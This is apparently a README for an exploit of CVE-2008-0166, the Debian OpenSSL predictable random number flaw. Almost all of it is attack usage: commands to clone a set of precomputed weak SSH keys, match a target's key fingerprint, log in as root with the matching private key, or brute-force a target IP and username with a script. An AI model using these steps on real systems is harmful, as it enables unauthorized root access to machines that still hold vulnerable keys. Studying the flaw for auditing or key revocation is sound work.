# CVE-2008-0166_predictable_prng_ssh_key_bruteforce

## Summary

OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys. 

## Usage

Clone keys

```sh
git clone https://github.com/g0tmi1k/debian-ssh.git
```

If you have a public key you can look at the fingerprint to try to figure out what private key will work.

```sh
$ ssh-keygen -l -f targetkey.pub
2048 c6:7b:14:fa:ae:b6:89:e6:67:17:ee:04:17:b0:ec:4e targetkey.pub
```
rsa/2048/**c67b14faaeb689e66717ee0417b0ec4e-26670**

Try to find this key in 'rsa/2048/' folder

```sh
ssh -i rsa/2048/c67b14faaeb689e66717ee0417b0ec4e-26670 root@targetmachine
```

Else start a bruteforce. This may take 1-2 hours.

```sh
./brutefoce.py debian-ssh/common_keys xx.xx.xx.xx username
```
